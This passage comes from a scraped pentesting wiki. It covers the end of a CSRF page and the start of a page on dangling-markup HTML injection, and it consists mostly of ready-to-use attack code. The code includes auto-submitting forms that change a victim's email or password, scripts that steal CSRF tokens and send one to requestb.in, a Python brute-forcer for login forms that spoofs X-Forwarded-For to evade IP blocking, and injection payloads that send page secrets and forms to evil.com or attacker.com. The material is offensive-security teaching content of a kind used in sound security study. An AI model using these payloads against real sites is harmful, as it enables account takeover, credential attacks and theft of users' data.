application/json\"\nwithout triggering a preflight request.\nYou could also try to\nbypass\nthis restriction by using a\nSWF flash file\n. More more information\nread this post\n.\nReferrer / Origin check bypass\nAvoid Referrer header\nSome applications validate the Referer header when it is present in requests but\nskip the validation if the header is omitted\n.\n<\nmeta\nname\n=\n\"\nreferrer\n\"\ncontent\n=\n\"\nnever\n\"\n>\nRegexp bypasses\nURL Format Bypass\nTo set the domain name of the server in the URL that the Referrer is going to send inside the parameters you can do:\n<\nhtml\n>\n<!-- Referrer policy needed to send the qury parameter in the referrer -->\n<\nhead\n>\n<\nmeta\nname\n=\n\"\nreferrer\n\"\ncontent\n=\n\"\nunsafe-url\n\"\n>\n</\nhead\n>\n<\nbody\n>\n<\nscript\n>\nhistory\n.\npushState\n(\n''\n,\n''\n,\n'/'\n)\n</\nscript\n>\n<\nform\naction\n=\n\"\nhttps://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email\n\"\nmethod\n=\n\"\nPOST\n\"\n>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nemail\n\"\nvalue\n=\n\"\nasd\n&#64;\nasd\n&#46;\nasd\n\"\n/>\n<\ninput\ntype\n=\n\"\nsubmit\n\"\nvalue\n=\n\"\nSubmit request\n\"\n/>\n</\nform\n>\n<\nscript\n>\n// You need to set this or the domain won't appear in the query of the referer header\nhistory\n.\npushState\n(\n\"\"\n,\n\"\"\n,\n\"?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net\"\n)\ndocument\n.\nforms\n[\n0\n].\nsubmit\n();\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\nHEAD method bypass\nThe first part of\nthis CTF writeup\nis explained that\nOak's source code\n, a router is set to\nhandle HEAD requests as GET requests\nwith no response body - a common workaround that isn't unique to Oak. Instead of a specific handler that deals with HEAD reqs, they're simply\ngiven to the GET handler but the app just removes the response body\n.\nTherefore, if a GET request is being limited, you could just\nsend a HEAD request that will be processed as a GET request\n.\nExploit Examples\nExfiltrating CSRF Token\nIf a\nCSRF token\nis being used as\ndefence\nyou could try to\nexfiltrate it\nabusing a\nXSS\nvulnerability or a\nDangling Markup\nvulnerability.\nGET using HTML tags\n<\nimg\nsrc\n=\n\"\nhttp://google.es?param=VALUE\n\"\nstyle\n=\n\"\ndisplay\n:\nnone\n\"\n/>\n<\nh1\n>\n404 - Page not found\n</\nh1\n>\nThe URL you are requesting is no longer available\nOther HTML5 tags that can be used to automatically send a GET request are:\nForm GET request\n<\nhtml\n>\n<!-- CSRF PoC - generated by Burp Suite Professional -->\n<\nbody\n>\n<\nscript\n>\nhistory\n.\npushState\n(\n''\n,\n''\n,\n'/'\n)\n</\nscript\n>\n<\nform\nmethod\n=\n\"\nGET\n\"\naction\n=\n\"\nhttps://victim.net/email/change-email\n\"\n>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nemail\n\"\nvalue\n=\n\"\n[email¬†protected]\n\"\n/>\n<\ninput\ntype\n=\n\"\nsubmit\n\"\nvalue\n=\n\"\nSubmit request\n\"\n/>\n</\nform\n>\n<\nscript\n>\ndocument\n.\nforms\n[\n0\n].\nsubmit\n();\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\nForm POST request\n<\nhtml\n>\n<\nbody\n>\n<\nscript\n>\nhistory\n.\npushState\n(\n''\n,\n''\n,\n'/'\n)\n</\nscript\n>\n<\nform\nmethod\n=\n\"\nPOST\n\"\naction\n=\n\"\nhttps://victim.net/email/change-email\n\"\nid\n=\n\"\ncsrfform\n\"\n>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nemail\n\"\nvalue\n=\n\"\n[email¬†protected]\n\"\nautofocus\nonfocus\n=\n\"\ncsrfform\n.\nsubmit\n();\n\"\n/>\n<!-- Way 1 to autosubmit -->\n<\ninput\ntype\n=\n\"\nsubmit\n\"\nvalue\n=\n\"\nSubmit request\n\"\n/>\n<\nimg\nsrc\n=\nx\nonerror\n=\n\"\ncsrfform\n.\nsubmit\n();\n\"\n/>\n<!-- Way 2 to autosubmit -->\n</\nform\n>\n<\nscript\n>\ndocument\n.\nforms\n[\n0\n].\nsubmit\n();\n//Way 3 to autosubmit\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\nForm POST request through iframe\n<!--\nThe request is sent through the iframe withuot reloading the page\n-->\n<\nhtml\n>\n<\nbody\n>\n<\niframe\nstyle\n=\n\"\ndisplay\n:\nnone\n\"\nname\n=\n\"\ncsrfframe\n\"\n>\n</\niframe\n>\n<\nform\nmethod\n=\n\"\nPOST\n\"\naction\n=\n\"\n/change-email\n\"\nid\n=\n\"\ncsrfform\n\"\ntarget\n=\n\"\ncsrfframe\n\"\n>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nemail\n\"\nvalue\n=\n\"\n[email¬†protected]\n\"\nautofocus\nonfocus\n=\n\"\ncsrfform\n.\nsubmit\n();\n\"\n/>\n<\ninput\ntype\n=\n\"\nsubmit\n\"\nvalue\n=\n\"\nSubmit request\n\"\n/>\n</\nform\n>\n<\nscript\n>\ndocument\n.\nforms\n[\n0\n].\nsubmit\n();\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\nAjax POST request\n<\nscript\n>\nvar\nxh\n;\nif\n(\nwindow\n.\nXMLHttpRequest\n)\n{\n// code for IE7+, Firefox, Chrome, Opera, Safari\nxh\n=\nnew\nXMLHttpRequest\n();\n}\nelse\n{\n// code for IE6, IE5\nxh\n=\nnew\nActiveXObject\n(\n\"Microsoft.XMLHTTP\"\n);\n}\nxh\n.\nwithCredentials\n=\ntrue\n;\nxh\n.\nopen\n(\n\"POST\"\n,\n\"http://challenge01.root-me.org/web-client/ch22/?action=profile\"\n);\nxh\n.\nsetRequestHeader\n(\n'Content-type'\n,\n'application/x-www-form-urlencoded'\n);\n//to send proper header info (optional, but good to have as it may sometimes not work without this)\nxh\n.\nsend\n(\n\"username=abcd&status=on\"\n);\n</\nscript\n>\n‚Äã\n<\nscript\n>\n//JQuery version\n$\n.\najax\n({\ntype\n:\n\"POST\"\n,\nurl\n:\n\"https://google.com\"\n,\ndata\n:\n\"param=value&param2=value2\"\n})\n</\nscript\n>\nmultipart/form-data POST request\nmyFormData\n=\nnew\nFormData\n();\nvar\nblob\n=\nnew\nBlob\n([\n\"<?php phpinfo(); ?>\"\n],\n{\ntype\n:\n\"text/text\"\n});\nmyFormData\n.\nappend\n(\n\"newAttachment\"\n,\nblob\n,\n\"pwned.php\"\n);\nfetch\n(\n\"http://example/some/path\"\n,\n{\nmethod\n:\n\"post\"\n,\nbody\n:\nmyFormData\n,\ncredentials\n:\n\"include\"\n,\nheaders\n:\n{\n\"Content-Type\"\n:\n\"application/x-www-form-urlencoded\"\n},\nmode\n:\n\"no-cors\"\n});\nmultipart/form-data POST request v2\nvar\nfileSize\n=\nfileData\n.\nlength\n,\nboundary\n=\n\"OWNEDBYOFFSEC\"\n,\nxhr\n=\nnew\nXMLHttpRequest\n();\nxhr\n.\nwithCredentials\n=\ntrue\n;\nxhr\n.\nopen\n(\n\"POST\"\n,\nurl\n,\ntrue\n);\n//  MIME POST request.\nxhr\n.\nsetRequestHeader\n(\n\"Content-Type\"\n,\n\"multipart/form-data, boundary=\"\n+\nboundary\n);\nxhr\n.\nsetRequestHeader\n(\n\"Content-Length\"\n,\nfileSize\n);\nvar\nbody\n=\n\"--\"\n+\nboundary\n+\n\"\\r\\n\"\n;\nbody\n+=\n'Content-Disposition: form-data; name=\"'\n+\nnameVar\n+\n'\"; filename=\"'\n+\nfileName\n+\n'\"\\r\\n'\n;\nbody\n+=\n\"Content-Type: \"\n+\nctype\n+\n\"\\r\\n\\r\\n\"\n;\nbody\n+=\nfileData\n+\n\"\\r\\n\"\n;\nbody\n+=\n\"--\"\n+\nboundary\n+\n\"--\"\n;\n‚Äã\n//xhr.send(body);\nxhr\n.\nsendAsBinary\n(\nbody\n);\nForm POST request from within an iframe\n<\n--!\nexpl.html\n--\n>\n‚Äã\n<\nbody\nonload\n=\n\"\nenvia\n()\n\"\n>\n<\nform\nmethod\n=\n\"\nPOST\n\"\nid\n=\n\"\nformulario\n\"\naction\n=\n\"\nhttp://aplicacion.example.com/cambia_pwd.php\n\"\n>\n<\ninput\ntype\n=\n\"\ntext\n\"\nid\n=\n\"\npwd\n\"\nname\n=\n\"\npwd\n\"\nvalue\n=\n\"\notra nueva\n\"\n>\n</\nform\n>\n<\nbody\n>\n<\nscript\n>\nfunction\nenvia\n(){\ndocument\n.\ngetElementById\n(\n\"formulario\"\n).\nsubmit\n();}\n</\nscript\n>\n‚Äã\n<!-- public.html -->\n<\niframe\nsrc\n=\n\"\n2-1.html\n\"\nstyle\n=\n\"\nposition\n:\nabsolute\n;\ntop\n:\n-5000\n\"\n>\n</\niframe\n>\n<\nh1\n>\nSitio bajo mantenimiento. Disculpe las molestias\n</\nh1\n>\nSteal CSRF Token and send a POST request\nfunction\nsubmitFormWithTokenJS\n(\ntoken\n)\n{\nvar\nxhr\n=\nnew\nXMLHttpRequest\n();\nxhr\n.\nopen\n(\n\"POST\"\n,\nPOST_URL\n,\ntrue\n);\nxhr\n.\nwithCredentials\n=\ntrue\n;\n‚Äã\n// Send the proper header information along with the request\nxhr\n.\nsetRequestHeader\n(\n\"Content-type\"\n,\n\"application/x-www-form-urlencoded\"\n);\n‚Äã\n// This is for debugging and can be removed\nxhr\n.\nonreadystatechange\n=\nfunction\n()\n{\nif\n(\nxhr\n.\nreadyState\n===\nXMLHttpRequest\n.\nDONE\n&&\nxhr\n.\nstatus\n===\n200\n)\n{\n//console.log(xhr.responseText);\n}\n}\n‚Äã\nxhr\n.\nsend\n(\n\"token=\"\n+\ntoken\n+\n\"&otherparama=heyyyy\"\n);\n}\n‚Äã\nfunction\ngetTokenJS\n()\n{\nvar\nxhr\n=\nnew\nXMLHttpRequest\n();\n// This tels it to return it as a HTML document\nxhr\n.\nresponseType\n=\n\"document\"\n;\nxhr\n.\nwithCredentials\n=\ntrue\n;\n// true on the end of here makes the call asynchronous\nxhr\n.\nopen\n(\n\"GET\"\n,\nGET_URL\n,\ntrue\n);\nxhr\n.\nonload\n=\nfunction\n(\ne\n)\n{\nif\n(\nxhr\n.\nreadyState\n===\nXMLHttpRequest\n.\nDONE\n&&\nxhr\n.\nstatus\n===\n200\n)\n{\n// Get the document from the response\npage\n=\nxhr\n.\nresponse\n// Get the input element\ninput\n=\npage\n.\ngetElementById\n(\n\"token\"\n);\n// Show the token\n//console.log(\"The token is: \" + input.value);\n// Use the token to submit the form\nsubmitFormWithTokenJS\n(\ninput\n.\nvalue\n);\n}\n};\n// Make the request\nxhr\n.\nsend\n(\nnull\n);\n}\n‚Äã\nvar\nGET_URL\n=\n\"http://google.com?param=VALUE\"\nvar\nPOST_URL\n=\n\"http://google.com?param=VALUE\"\ngetTokenJS\n();\nSteal CSRF Token and send a Post request using an iframe, a form and Ajax\n<\nform\nid\n=\n\"\nform1\n\"\naction\n=\n\"\nhttp://google.com?param=VALUE\n\"\nmethod\n=\n\"\npost\n\"\nenctype\n=\n\"\nmultipart/form-data\n\"\n>\n<\ninput\ntype\n=\n\"\ntext\n\"\nname\n=\n\"\nusername\n\"\nvalue\n=\n\"\nAA\n\"\n>\n<\ninput\ntype\n=\n\"\ncheckbox\n\"\nname\n=\n\"\nstatus\n\"\nchecked\n=\n\"\nchecked\n\"\n>\n<\ninput\nid\n=\n\"\ntoken\n\"\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\ntoken\n\"\nvalue\n=\n\"\"\n/>\n</\nform\n>\n‚Äã\n<\nscript\ntype\n=\n\"\ntext/javascript\n\"\n>\nfunction\nf1\n(){\nx1\n=\ndocument\n.\ngetElementById\n(\n\"i1\"\n);\nx1d\n=\n(\nx1\n.\ncontentWindow\n||\nx1\n.\ncontentDocument\n);\nt\n=\nx1d\n.\ndocument\n.\ngetElementById\n(\n\"token\"\n).\nvalue\n;\ndocument\n.\ngetElementById\n(\n\"token\"\n).\nvalue\n=\nt\n;\ndocument\n.\ngetElementById\n(\n\"form1\"\n).\nsubmit\n();\n}\n</\nscript\n>\n<\niframe\nid\n=\n\"\ni1\n\"\nstyle\n=\n\"\ndisplay\n:\nnone\n\"\nsrc\n=\n\"\nhttp://google.com?param=VALUE\n\"\nonload\n=\n\"\njavascript\n:\nf1\n();\n\"\n>\n</\niframe\n>\nSteal CSRF Token and sen a POST request using an iframe and a form\n<\niframe\nid\n=\n\"\niframe\n\"\nsrc\n=\n\"\nhttp://google.com?param=VALUE\n\"\nwidth\n=\n\"\n500\n\"\nheight\n=\n\"\n500\n\"\nonload\n=\n\"\nread\n()\n\"\n>\n</\niframe\n>\n‚Äã\n<\nscript\n>\nfunction\nread\n()\n{\nvar\nname\n=\n'admin2'\n;\nvar\ntoken\n=\ndocument\n.\ngetElementById\n(\n\"iframe\"\n).\ncontentDocument\n.\nforms\n[\n0\n].\ntoken\n.\nvalue\n;\ndocument\n.\nwriteln\n(\n'<form width=\"0\" height=\"0\" method=\"post\" action=\"http://www.yoursebsite.com/check.php\"  enctype=\"multipart/form-data\">'\n);\ndocument\n.\nwriteln\n(\n'<input id=\"username\" type=\"text\" name=\"username\" value=\"'\n+\nname\n+\n'\" /><br />'\n);\ndocument\n.\nwriteln\n(\n'<input id=\"token\" type=\"hidden\" name=\"token\" value=\"'\n+\ntoken\n+\n'\" />'\n);\ndocument\n.\nwriteln\n(\n'<input type=\"submit\" name=\"submit\" value=\"Submit\" /><br/>'\n);\ndocument\n.\nwriteln\n(\n'</form>'\n);\ndocument\n.\nforms\n[\n0\n].\nsubmit\n.\nclick\n();\n}\n</\nscript\n>\nSteal token and send it using 2 iframes\n<\nscript\n>\nvar\ntoken\n;\nfunction\nreadframe1\n(){\ntoken\n=\nframe1\n.\ndocument\n.\ngetElementById\n(\n\"profile\"\n).\ntoken\n.\nvalue\n;\ndocument\n.\ngetElementById\n(\n\"bypass\"\n).\ntoken\n.\nvalue\n=\ntoken\nloadframe2\n();\n}\nfunction\nloadframe2\n(){\nvar\ntest\n=\ndocument\n.\ngetElementbyId\n(\n\"frame2\"\n);\ntest\n.\nsrc\n=\n\"http://requestb.in/1g6asbg1?token=\"\n+\ntoken\n;\n}\n</\nscript\n>\n‚Äã\n<\niframe\nid\n=\n\"\nframe1\n\"\nname\n=\n\"\nframe1\n\"\nsrc\n=\n\"\nhttp://google.com?param=VALUE\n\"\nonload\n=\n\"\nreadframe1\n()\n\"\nsandbox\n=\n\"\nallow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation\n\"\nheight\n=\n\"\n600\n\"\nwidth\n=\n\"\n800\n\"\n>\n</\niframe\n>\n‚Äã\n<\niframe\nid\n=\n\"\nframe2\n\"\nname\n=\n\"\nframe2\n\"\nsandbox\n=\n\"\nallow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation\n\"\nheight\n=\n\"\n600\n\"\nwidth\n=\n\"\n800\n\"\n>\n</\niframe\n>\n<\nbody\nonload\n=\n\"\ndocument\n.\nforms\n[\n0\n].\nsubmit\n()\n\"\n>\n<\nform\nid\n=\n\"\nbypass\n\"\nname\"bypass\"\nmethod\n=\n\"\nPOST\n\"\ntarget\n=\n\"\nframe2\n\"\naction\n=\n\"\nhttp://google.com?param=VALUE\n\"\nenctype\n=\n\"\nmultipart/form-data\n\"\n>\n<\ninput\ntype\n=\n\"\ntext\n\"\nname\n=\n\"\nusername\n\"\nvalue\n=\n\"\nz\n\"\n>\n<\ninput\ntype\n=\n\"\ncheckbox\n\"\nname\n=\n\"\nstatus\n\"\nchecked\n=\n\"\"\n>\n<\ninput\nid\n=\n\"\ntoken\n\"\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\ntoken\n\"\nvalue\n=\n\"\n0000\n\"\n/>\n<\nbutton\ntype\n=\n\"\nsubmit\n\"\n>\nSubmit\n</\nbutton\n>\n</\nform\n>\nPOSTSteal CSRF token with Ajax and send a post with a form\n<\nbody\nonload\n=\n\"\ngetData\n()\n\"\n>\n‚Äã\n<\nform\nid\n=\n\"\nform\n\"\naction\n=\n\"\nhttp://google.com?param=VALUE\n\"\nmethod\n=\n\"\nPOST\n\"\nenctype\n=\n\"\nmultipart/form-data\n\"\n>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nusername\n\"\nvalue\n=\n\"\nroot\n\"\n/>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nstatus\n\"\nvalue\n=\n\"\non\n\"\n/>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nid\n=\n\"\nfindtoken\n\"\nname\n=\n\"\ntoken\n\"\nvalue\n=\n\"\"\n/>\n<\ninput\ntype\n=\n\"\nsubmit\n\"\nvalue\n=\n\"\nvalider\n\"\n/>\n</\nform\n>\n‚Äã\n<\nscript\n>\nvar\nx\n=\nnew\nXMLHttpRequest\n();\nfunction\ngetData\n()\n{\nx\n.\nwithCredentials\n=\ntrue\n;\nx\n.\nopen\n(\n\"GET\"\n,\n\"http://google.com?param=VALUE\"\n,\ntrue\n);\nx\n.\nsend\n(\nnull\n);\n}\nx\n.\nonreadystatechange\n=\nfunction\n()\n{\nif\n(\nx\n.\nreadyState\n==\nXMLHttpRequest\n.\nDONE\n)\n{\nvar\ntoken\n=\nx\n.\nresponseText\n.\nmatch\n(\n/\nname=\"token\" value=\"(.+)\"\n/\n)[\n1\n];\ndocument\n.\ngetElementById\n(\n\"findtoken\"\n).\nvalue\n=\ntoken\n;\ndocument\n.\ngetElementById\n(\n\"form\"\n).\nsubmit\n();\n}\n}\n</\nscript\n>\nCSRF with Socket.IO\n<\nscript\nsrc\n=\n\"\nhttps://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js\n\"\n>\n</\nscript\n>\n<\nscript\n>\nlet\nsocket\n=\nio\n(\n'http://six.jh2i.com:50022/test'\n);\n‚Äã\nconst\nusername\n=\n'admin'\n‚Äã\nsocket\n.\non\n(\n'connect'\n,\n()\n=>\n{\nconsole\n.\nlog\n(\n'connected!'\n);\nsocket\n.\nemit\n(\n'join'\n,\n{\nroom\n:\nusername\n});\nsocket\n.\nemit\n(\n'my_room_event'\n,\n{\ndata\n:\n'!flag'\n,\nroom\n:\nusername\n})\n‚Äã\n});\n</\nscript\n>\nCSRF Login Brute Force\nThe code can be used to Brut Force a login form using a CSRF token (It's also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):\nimport\nrequest\nimport\nre\nimport\nrandom\n‚Äã\nURL\n=\n\"http://10.10.10.191/admin/\"\nPROXY\n=\n{\n\"http\"\n:\n\"127.0.0.1:8080\"\n}\nSESSION_COOKIE_NAME\n=\n\"BLUDIT-KEY\"\nUSER\n=\n\"fergus\"\nPASS_LIST\n=\n\"./words\"\n‚Äã\ndef\ninit_session\n():\n#Return CSRF + Session (cookie)\nr\n=\nrequests\n.\nget\n(\nURL\n)\ncsrf\n=\nre\n.\nsearch\n(\nr'input type=\"hidden\" id=\"jstokenCSRF\" name=\"tokenCSRF\" value=\"([a-zA-Z0-9]*)\"'\n,\nr\n.\ntext\n)\ncsrf\n=\ncsrf\n.\ngroup\n(\n1\n)\nsession_cookie\n=\nr\n.\ncookies\n.\nget\n(\nSESSION_COOKIE_NAME\n)\nreturn\ncsrf\n,\nsession_cookie\n‚Äã\ndef\nlogin\n(\nuser\n,\npassword\n):\nprint\n(\nf\"\n{\nuser\n}\n:\n{\npassword\n}\n\"\n)\ncsrf\n,\ncookie\n=\ninit_session\n()\ncookies\n=\n{\nSESSION_COOKIE_NAME\n:\ncookie\n}\ndata\n=\n{\n\"tokenCSRF\"\n:\ncsrf\n,\n\"username\"\n:\nuser\n,\n\"password\"\n:\npassword\n,\n\"save\"\n:\n\"\"\n}\nheaders\n=\n{\n\"X-Forwarded-For\"\n:\nf\"\n{\nrandom\n.\nrandint\n(\n1\n,\n256\n)}\n.\n{\nrandom\n.\nrandint\n(\n1\n,\n256\n)}\n.\n{\nrandom\n.\nrandint\n(\n1\n,\n256\n)}\n.\n{\nrandom\n.\nrandint\n(\n1\n,\n256\n)}\n\"\n}\nr\n=\nrequests\n.\npost\n(\nURL\n,\ndata\n=\ndata\n,\ncookies\n=\ncookies\n,\nheaders\n=\nheaders\n,\nproxies\n=\nPROXY\n)\nif\n\"Username or password incorrect\"\nin\nr\n.\ntext\n:\nreturn\nFalse\nelse\n:\nprint\n(\nf\"FOUND\n{\nuser\n}\n:\n{\npassword\n}\n\"\n)\nreturn\nTrue\n‚Äã\nwith\nopen\n(\nPASS_LIST\n,\n\"r\"\n)\nas\nf\n:\nfor\nline\nin\nf\n:\nlogin\n(\nUSER\n,\nline\n.\nstrip\n())\nTools\n‚Äã\nhttps://github.com/0xInfection/XSRFProbe\n‚Äã\n‚Äã\nhttps://github.com/merttasci/csrf-poc-generator\n‚Äã\nReferences\n‚Äã\nhttps://portswigger.net/web-security/csrf\n‚Äã\n‚Äã\nhttps://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html\n‚Äã\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nCRLF (%0D%0A) Injection\nNext\n- Pentesting Web\nDangling Markup - HTML scriptless injection\nLast modified\n3mo ago"
    },
    {
        "title": "Dangling Markup - HTML scriptless injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection",
        "text": "Dangling Markup - HTML scriptless injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nResume\nThis technique can be use to extract information from a user when an\nHTML injection is found\n. This is very useful if you\ndon't find any way to exploit a\nXSS\nbut you can\ninject some HTML tags\n.\nIt is also useful if some\nsecret is saved in clear text\nin the HTML and you want to\nexfiltrate\nit from the client, or if you want to mislead some script execution.\nSeveral techniques commented here can be used to bypass some\nContent Security Policy\nby exfiltrating information in unexpected ways (html tags, CSS, http-meta tags, forms, base...).\nMain Applications\nStealing clear text secrets\nIf you inject\n<img src='http://evil.com/log.cgi?\nwhen the page is loaded the victim will send you all the code between the injected\nimg\ntag and the next quote inside the code. If a secret is somehow located in that chunk, you will steal i t(you can do the same thing using a double quote,take a look which could be more interesting to use).\nIf the\nimg\ntag is forbidden (due to CSP for example) you can also use\n<meta http-equiv=\"refresh\" content=\"4; URL='http://evil.com/log.cgi?\n<img src='http://attacker.com/log.php?HTML=\n<meta http-equiv=\"refresh\" content='0; url=http://evil.com/log.php?text=\n<meta http-equiv=\"refresh\" content='0;URL=ftp://evil.com?a=\nNote that\nChrome blocks HTTP URLs\nwith \"<\" or \"\\n\" in it, so you could try other protocol schemes like \"ftp\".\nYou can also abuse CSS\n@import\n(will send all the code until it find a \";\")\n<\nstyle\n>\n@import//hackvertor.co.uk?\n<\n---\nInjected\n<b\n>\nsteal me!\n</\nb\n>\n;\nYou could also use\n<table\n:\n<\ntable\nbackground\n=\n'//your-collaborator-id.burpcollaborator.net?'\nYou could also insert a\n<base\ntag. All the information will be sent until the quote is closed but it requires some user interaction (the user must click in some link, because the base tag will have changed the domain pointed by the link):\n<\nbase\ntarget\n=\n'\n<--- Injected\nsteal me\n'\n<b\n>\ntest\n</\nb\n>\nStealing forms\n<\nbase\nhref\n=\n'\nhttp://evil.com/\n'\n>\nThen, the forms that send data to path (like\n<form action='update_profile.php'>\n) will send the data to the malicious domain.\nStealing forms 2\nSet a form header:\n<form action='http://evil.com/log_steal'>\nthis will overwrite the next form header and all the data from the form will be sent to the attacker.\nStealing forms 3\nThe button can change the URL where the information of the form is going to be sent with the attribute \"formaction\":\n<\nbutton\nname\n=\nxss\ntype\n=\nsubmit\nformaction\n=\n'\nhttps://google.com\n'\n>\nI get consumed!\nAn attacker can use this to steal the information.\nStealing clear text secrets 2\nUsing the latest mentioned technique to steal forms (injecting a new form header) you can then inject a new input field:\n<input type='hidden' name='review_body' value=\"\nand this input field will contain all the content between its double quote and the next double quote in the HTML. This attack mix the \"\nStealing clear text secrets\n\" with \"\nStealing forms2\n\".\nYou can do the same thing injecting a form and an\n<option>\ntag. All the data until a closed\n</option>\nis found will be sent:\n<\nform\naction\n=\nhttp://google.com\n>\n<\ninput\ntype\n=\n\"\nsubmit\n\"\n>\nClick Me\n</\ninput\n>\n<\nselect\nname\n=\nxss\n>\n<option\nForm parameter injection\nYou can change the path of a form and insert new values so an unexpected action will be performed:\n<\nform\naction\n=\n'\n/change_settings.php\n'\n>\n<\ninput\ntype\n=\n'\nhidden\n'\nname\n=\n'\ninvite_user\n'\nvalue\n=\n'\nfredmbogo\n'\n>\n‚Üê Injected lines\n‚Äã\n<\nform\naction\n=\n\"\n/change_settings.php\n\"\n>\n‚Üê Existing form (ignored by the parser)\n...\n<\ninput\ntype\n=\n\"\ntext\n\"\nname\n=\n\"\ninvite_user\n\"\nvalue\n=\n\"\"\n>\n‚Üê Subverted field\n...\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nxsrf_token\n\"\nvalue\n=\n\"\n12345\n\"\n>\n...\n</\nform\n>\nStealing clear text secrets via noscript\n<noscript></noscript>\nIs a tag whose content will be interpreted if the browser doesn't support javascript (you can enable/disable Javascript in Chrome in\nchrome://settings/content/javascript\n).\nA way to exfiltrate the content of the web page from the point of injection to the bottom to an attacker controlled site will be injecting this:\n<\nnoscript\n>\n<\nform\naction\n=\nhttp://evil.com\n>\n<\ninput\ntype\n=\nsubmit\nstyle\n=\n\"\nposition\n:\nabsolute\n;\nleft\n:\n0\n;\ntop\n:\n0\n;\nwidth\n:\n100%\n;\nheight\n:\n100%\n;\n\"\ntype\n=\nsubmit\nvalue\n=\n\"\"\n>\n<\ntextarea\nname\n=\ncontents\n>\n</\nnoscript\n>\nBypassing CSP with user interaction\nFrom this\nportswiggers research\nyou can learn that even from the\nmost CSP restricted\nenvironments you can still\nexfiltrate data\nwith some\nuser interaction\n. In this occasion we are going to use the payload:\n<\na\nhref\n=\nhttp://attacker.net/payload.html\n>\n<\nfont\nsize\n=\n100\ncolor\n=\nred\n>\nYou must click me\n</\nfont\n>\n</\na\n>\n<base target='\nNote that you will ask the\nvictim\nto\nclick on a link\nthat will\nredirect\nhim to\npayload\ncontrolled by you. Also note that the\ntarget\nattribute inside the\nbase\ntag will contain\nHTML content\nuntil the next single quote.\nThis will make that the\nvalue\nof\nwindow.name\nif the link is clicked is going to be all that\nHTML content\n. Therefore, as you\ncontrol the page\nwhere the victim is accessing by clicking the link, you can access that\nwindow.name\nand\nexfiltrate\nthat data:\n<\nscript\n>\nif\n(\nwindow\n.\nname\n)\n{\nnew\nImage\n().\nsrc\n=\n'//your-collaborator-id.burpcollaborator.net?'\n+\nencodeURIComponent\n(\nwindow\n.\nname\n);\n</\nscript\n>\nMisleading script workflow 1 - HTML namespace attack\nInsert a new tag with and id inside the HTML that will overwrite the next one and with a value that will affect the flow of a script. In this example you are selecting with whom a information is going to be shared:\n<\ninput\ntype\n=\n'\nhidden\n'\nid\n=\n'\nshare_with\n'\nvalue\n=\n'\nfredmbogo\n'\n>\n‚Üê Injected markup\n...\nShare this status update with:                              ‚Üê Legitimate optional element of a dialog\n<\ninput\nid\n=\n'\nshare_with\n'\nvalue\n=\n''\n>\n‚Äã\n...\n‚Äã\nfunction submit_status_update() {\n...\nrequest.share_with = document.getElementById('share_with').value;\n...\n}\nMisleading script workflow 2 - Script namespace attack\nCreate variables inside javascript namespace by inserting HTML tags. Then, this variable will affect the flow of the application:\n<\nimg\nid\n=\n'\nis_public\n'\n>\n‚Üê Injected markup\n‚Äã\n...\n‚Äã\n// Legitimate application code follows\n‚Äã\nfunction retrieve_acls() {\n...\nif (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE\nis_public = true;\nelse\nis_public = false;\n}\n‚Äã\nfunction submit_new_acls() {\n...\nif (is_public) request.access_mode = AM_PUBLIC;           